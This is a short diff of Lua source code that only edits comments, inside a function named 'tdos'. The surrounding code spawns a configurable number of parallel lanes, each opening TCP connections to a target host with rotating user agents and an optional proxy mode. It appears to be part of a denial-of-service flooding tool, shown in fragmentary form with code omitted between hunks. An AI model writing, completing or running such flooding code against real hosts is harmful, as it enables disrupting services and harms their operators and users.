@@ -149,7 +149,7 @@ local function tdos()
             if config.useproxies then
                 print("proxies")
             else
-                for i = 1, config.MAXTASK do --allocate stuff
+                for i = 1, config.MAXTASK do --allocate
                     activelanes[i] = lanes.gen("*", function()
                                         local socket = require("socket")
                                         local useragent = require("useragent")
@@ -159,7 +159,7 @@ local function tdos()
                                             tcp:close()
                                             io.write("send ".. inputhost.."\n")
                                         end
-                                    end)() -- this run
+                                    end)()
                 end
                 for i = 1, #activelanes do  --free
                     local sellanes = activelanes[i]
